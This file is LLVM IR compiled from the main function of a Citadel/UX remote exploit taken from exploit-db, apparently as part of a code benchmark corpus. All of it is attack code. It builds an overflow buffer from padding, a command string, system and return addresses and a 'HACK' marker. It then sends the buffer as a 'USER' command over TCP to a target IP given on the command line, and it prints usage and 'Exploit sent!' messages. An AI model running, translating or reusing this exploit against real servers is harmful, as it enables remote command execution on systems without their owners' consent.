; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24339.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24339.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [109 x i8] c"\0D\0ACitadel/UX remote exploit by nebunu <pppppppal at yahoo dot com>\0D\0AUsage: %s <target ip> <retaddr offset>\0D\0A\00", align 1
@COMMAND = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [29 x i8] c"\0D\0ACommand string too large\0D\0A\00", align 1
@BUFFER = common dso_local global i32 0, align 4
@SYSADDR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"HACK\00", align 1
@RETADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@CITADEL_PORT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"\0D\0AConnected..OK\0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"Sending exploit code..\0A\00", align 1
@.str.9 = private unnamed_addr constant [39 x i8] c"Exploit sent! Now test if succesfull.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [500 x i8], align 16
  %12 = alloca [8 x i8], align 1
  %13 = alloca [8 x i8], align 1
  %14 = alloca [500 x i8], align 16
  %15 = alloca i32*, align 8
  %16 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 3
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 -1) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i8*, i8** @COMMAND, align 8
  %27 = call i32 @strlen(i8* %26)
  %28 = icmp sgt i32 %27, 90
  br i1 %28, label %29, label %32

29:                                               ; preds = %25
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %25
  %33 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %34 = call i32 @memset(i8* %33, i32 0, i32 500)
  %35 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %36 = call i32 @memset(i8* %35, i32 0, i32 500)
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %38 = call i32 @memset(i8* %37, i32 0, i32 8)
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %12, i64 0, i64 0
  %40 = call i32 @memset(i8* %39, i32 0, i32 8)
  store i32 0, i32* %6, align 4
  br label %41

41:                                               ; preds = %52, %32
  %42 = load i32, i32* %6, align 4
  %43 = load i32, i32* @BUFFER, align 4
  %44 = load i8*, i8** @COMMAND, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = sub nsw i32 %43, %45
  %47 = icmp slt i32 %42, %46
  br i1 %47, label %48, label %55

48:                                               ; preds = %41
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 %50
  store i8 47, i8* %51, align 1
  br label %52

52:                                               ; preds = %48
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %6, align 4
  br label %41

55:                                               ; preds = %41
  %56 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %57 = load i8*, i8** @COMMAND, align 8
  %58 = call i32 @strcat(i8* %56, i8* %57)
  %59 = getelementptr inbounds [8 x i8], [8 x i8]* %12, i64 0, i64 0
  %60 = bitcast i8* %59 to i32*
  store i32* %60, i32** %15, align 8
  store i32 0, i32* %6, align 4
  br label %61

61:                                               ; preds = %68, %55
  %62 = load i32, i32* %6, align 4
  %63 = icmp slt i32 %62, 4
  br i1 %63, label %64, label %71

64:                                               ; preds = %61
  %65 = load i32, i32* @SYSADDR, align 4
  %66 = load i32*, i32** %15, align 8
  %67 = getelementptr inbounds i32, i32* %66, i32 1
  store i32* %67, i32** %15, align 8
  store i32 %65, i32* %66, align 4
  br label %68

68:                                               ; preds = %64
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, 4
  store i32 %70, i32* %6, align 4
  br label %61

71:                                               ; preds = %61
  %72 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %73 = getelementptr inbounds [8 x i8], [8 x i8]* %12, i64 0, i64 0
  %74 = call i32 @strcat(i8* %72, i8* %73)
  %75 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %76 = call i32 @strcat(i8* %75, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %77 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %78 = bitcast i8* %77 to i32*
  store i32* %78, i32** %15, align 8
  store i32 0, i32* %6, align 4
  br label %79

79:                                               ; preds = %91, %71
  %80 = load i32, i32* %6, align 4
  %81 = icmp slt i32 %80, 4
  br i1 %81, label %82, label %94

82:                                               ; preds = %79
  %83 = load i32, i32* @RETADDR, align 4
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 2
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @atoi(i8* %86)
  %88 = add nsw i32 %83, %87
  %89 = load i32*, i32** %15, align 8
  %90 = getelementptr inbounds i32, i32* %89, i32 1
  store i32* %90, i32** %15, align 8
  store i32 %88, i32* %89, align 4
  br label %91

91:                                               ; preds = %82
  %92 = load i32, i32* %6, align 4
  %93 = add nsw i32 %92, 4
  store i32 %93, i32* %6, align 4
  br label %79

94:                                               ; preds = %79
  %95 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %96 = getelementptr inbounds [8 x i8], [8 x i8]* %13, i64 0, i64 0
  %97 = call i32 @strcat(i8* %95, i8* %96)
  %98 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %99 = call i32 @strcpy(i8* %98, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %100 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %101 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %102 = call i32 @strcat(i8* %100, i8* %101)
  %103 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %104 = call i32 @strcat(i8* %103, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %105 = load i32, i32* @AF_INET, align 4
  %106 = load i32, i32* @SOCK_STREAM, align 4
  %107 = call i32 @socket(i32 %105, i32 %106, i32 0)
  store i32 %107, i32* %7, align 4
  %108 = load i32, i32* %7, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %113

110:                                              ; preds = %94
  %111 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %112 = call i32 @exit(i32 -1) #3
  unreachable

113:                                              ; preds = %94
  %114 = load i32, i32* @AF_INET, align 4
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  store i32 %114, i32* %115, align 4
  %116 = load i32, i32* @CITADEL_PORT, align 4
  %117 = call i32 @htons(i32 %116)
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i32 %117, i32* %118, align 4
  %119 = load i8**, i8*** %5, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 1
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @inet_addr(i8* %121)
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  %124 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %123, i32 0, i32 0
  store i32 %122, i32* %124, align 4
  %125 = load i32, i32* %7, align 4
  %126 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %127 = call i32 @connect(i32 %125, %struct.sockaddr* %126, i32 12)
  store i32 %127, i32* %8, align 4
  %128 = load i32, i32* %8, align 4
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %130, label %133

130:                                              ; preds = %113
  %131 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %132 = call i32 @exit(i32 -1) #3
  unreachable

133:                                              ; preds = %113
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %136 = load i32, i32* %7, align 4
  %137 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %138 = getelementptr inbounds [500 x i8], [500 x i8]* %14, i64 0, i64 0
  %139 = call i32 @strlen(i8* %138)
  %140 = call i32 @write(i32 %136, i8* %137, i32 %139)
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.9, i64 0, i64 0))
  %142 = load i32, i32* %3, align 4
  ret i32 %142
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
